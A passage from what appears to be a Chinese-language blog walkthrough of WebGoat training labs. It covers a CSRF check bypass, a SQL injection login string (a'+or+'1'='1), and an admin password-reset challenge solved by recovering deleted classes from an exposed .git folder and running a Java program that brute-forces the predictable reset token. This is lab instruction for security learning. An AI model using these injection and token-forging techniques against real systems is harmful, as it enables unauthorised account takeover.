<span class="kd">private</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">requestContainsWebGoatCookie</span><span class="p">(</span><span class="n">Cookie</span><span class="o">[]</span><span class="w"> </span><span class="n">cookies</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cookies</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Cookie</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">cookies</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;JSESSIONID&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>可以发现：如果<code>correctCSRF</code>的值为<code>true</code>，则进入<code>if</code>条件分支，生成<code>flag</code>并调用<code>success()</code>返回；否则失败。而<code>correctCSRF</code>的值由三个判断决定：第一个是请求的<code>Cookie</code>不能为空且必须包含<code>JSESSIONID</code>；其次请求的<code>ContentType</code>需包含<code>text/plain</code>；最后请求的<code>Referer</code>不能包含<code>Host</code>的值。第一个条件默认是满足的，我们只需要修改<code>Content-Type</code>和<code>Referer</code>即可，如下图：</p>
<p><img alt="image-20221231184207906" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221231184207906.png" /></p>
<h3 id="challengectf"><code>Challenge(CTF)</code></h3>
<h5 id="admin-lost-password"><code>Admin lost password</code></h5>
<h5 id="without-password"><code>Without password</code></h5>
<p>直接万能密码<code>a'+or+'1'='1</code>成功登录。</p>
<h5 id="admin-password-reset"><code>Admin password reset</code></h5>
<p>按照常规的<code>CTF</code>思路来说，我们需要输入邮箱地址，获取重置密码的链接，访问链接页面提示不是<code>admin</code>账户的重置链接。然后访问路径下的<code>.git</code>，下载<code>git</code>压缩包，解压后，正在该路径打开<code>git</code>终端，输入命令：</p>
<div class="highlight"><pre><span></span><code>$ git config core.worktree .            <span class="c1"># 设置当前目录为主工作树目录</span>
$ git status                            <span class="c1"># 发现存在删除的源文件</span>
     deleted:    Challenge7.html
     deleted:    Challenge_7.adoc
     deleted:    MD5<span class="nv">$1</span>.class
     deleted:    MD5<span class="nv">$MD5State</span>.class
     deleted:    MD5.class
     deleted:    PasswordResetLink.class
$ git checkout -- MD5.class                 <span class="c1"># 下载MD5.class文件</span>
$ git checkout -- PasswordResetLink.class   <span class="c1"># 下载PasswordResetLink.class文件</span>
</code></pre></div>
<p>拿到编译后的源文件，我们可以使用<code>IDEA</code>打开自动反编译。这里我们就不费这些事了，直接查看源代码。</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">createPasswordReset</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">Random</span><span class="w"> </span><span class="n">random</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Random</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&quot;admin&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="c1">//Admin has a fix reset link</span><span class="w"></span>
<span class="w">        </span><span class="n">random</span><span class="p">.</span><span class="na">setSeed</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="na">length</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">scramble</span><span class="p">(</span><span class="n">random</span><span class="p">,</span><span class="w"> </span><span class="n">scramble</span><span class="p">(</span><span class="n">random</span><span class="p">,</span><span class="w"> </span><span class="n">scramble</span><span class="p">(</span><span class="n">random</span><span class="p">,</span><span class="w"> </span><span class="n">MD5</span><span class="p">.</span><span class="na">getHashString</span><span class="p">(</span><span class="n">username</span><span class="p">))));</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">scramble</span><span class="p">(</span><span class="n">Random</span><span class="w"> </span><span class="n">random</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">inputString</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inputString</span><span class="p">.</span><span class="na">toCharArray</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">random</span><span class="p">.</span><span class="na">nextInt</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="na">length</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">temp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">a</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="o">[</span><span class="n">j</span><span class="o">]</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">a</span><span class="o">[</span><span class="n">j</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">temp</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">a</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>如果<code>username</code>的值为<code>admin</code>，则以<code>key</code>的长度为种子设置随机数。取<code>username</code>的<code>MD5</code>值，与随机数作为参数，进行三次<code>scramble</code>函数迭代。我们通过代码来遍历<code>key</code>的长度，并拼接重置密码链接，发起<code>HTTP</code>请求来实现破解<code>admin</code>账户的重置密码链接，代码如下：</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">Random</span><span class="w"> </span><span class="n">random</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Random</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">50</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">random</span><span class="p">.</span><span class="na">setSeed</span><span class="p">(</span><span class="n">i</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">scramble</span><span class="p">(</span><span class="n">random</span><span class="p">,</span><span class="w"> </span><span class="n">scramble</span><span class="p">(</span><span class="n">random</span><span class="p">,</span><span class="w"> </span><span class="n">scramble</span><span class="p">(</span><span class="n">random</span><span class="p">,</span><span class="w"> </span><span class="n">DigestUtils</span><span class="p">.</span><span class="na">md5Hex</span><span class="p">(</span><span class="s">&quot;admin&quot;</span><span class="p">))));</span><span class="w"></span>
<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">httpRequest</span><span class="p">(</span><span class="n">flag</span><span class="p">));</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">scramble</span><span class="p">(</span><span class="n">Random</span><span class="w"> </span><span class="n">random</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">inputString</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inputString</span><span class="p">.</span><span class="na">toCharArray</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">random</span><span class="p">.</span><span class="na">nextInt</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="na">length</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">temp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">a</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="o">[</span><span class="n">j</span><span class="o">]</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">a</span><span class="o">[</span><span class="n">j</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">temp</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">a</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">httpRequest</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">link</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;http://127.0.0.1:9080/WebGoat/challenge/7/reset-password/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">flag</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">URL</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="n">link</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">URLConnection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="na">openConnection</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="n">conn</span><span class="p">.</span><span class="na">setRequestProperty</span><span class="p">(</span><span class="s">&quot;accept&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;*/*&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">conn</span><span class="p">.</span><span class="na">setRequestProperty</span><span class="p">(</span><span class="s">&quot;Cookie&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;JSESSIONID=QcQIu1ZbfngWQaTiJHa-WLRaCB6PMF7vq6FHMuQ_&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">conn</span><span class="p">.</span><span class="na">connect</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">()));</span><span class="w"></span>
<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">line</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">output</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">line</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">output</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>需要做几点说明：</p>
<ul>
<li>源代码中<code>MD5</code>加密是自定义的<code>MD5</code>类的<code>getHashString</code>方法，其实就是实现一个简单的<code>MD5</code>加密的功能，这里我们使用现成的工具包<code>org.apache.commons.codec.digest.DigestUtils</code>的<code>md5Hex</code>方法代替；</li>
<li><code>scramble</code>方法直接照搬源码中的方法即可；</li>
<li>重置密码的链接可以先输入自己的账户名，在<code>WebWolf</code>的<code>Mailbox</code>模块中收到邮件，从而得到重置密码的链接。只不过这个链接不是<code>admin</code>账户的，我们需要修改链接最后部分的随机字符串。发起<code>HTTP</code>请求的必须携带已登录的会话的<code>Cookie</code>，否则请求会自动跳转到登录页面，以上代码中的<code>Cookie</code>需要根据实际进行修改。</li>
</ul>
<p>代码执行效果如下：</p>
<p><img alt="image-20230101004113571" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20230101004113571.png" /></p>





                
              </article>
            </div>
          
          
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
    <nav class="md-footer__inner md-grid" aria-label="页脚" >
      
        
        <a href="../../Android/Santoku%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Santoku安装配置" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                上一页
              </span>
              Santoku安装配置
            </div>
          </div>
        </a>
      
      
        
        <a href="../../K8S/%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BAK8S%E9%9B%86%E7%BE%A4/" class="md-footer__link md-footer__link--next" aria-label="下一页: 从零搭建K8S集群" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                下一页
              </span>
              从零搭建K8S集群
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.5bf1dace.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.37e9125f.min.js"></script>
      
    
  </body>
</html>